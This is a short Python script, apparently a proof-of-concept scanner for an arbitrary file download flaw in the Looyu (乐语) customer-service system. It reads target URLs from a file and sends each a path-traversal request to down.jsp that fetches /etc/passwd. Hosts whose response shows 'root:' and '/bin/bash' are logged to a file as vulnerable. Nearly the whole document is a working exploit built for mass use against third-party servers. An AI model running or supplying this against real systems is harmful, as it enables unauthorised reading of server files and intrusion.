
import json
import requests


urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/live/down.jsp?file=../../../../../../../../../../../../../../../../etc/passwd"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)

        if r"root:" in req.text and r"/bin/bash" in req.text:
            print("[+]存在乐语客服系统任意文件下载漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在looyu_down_filedownload漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")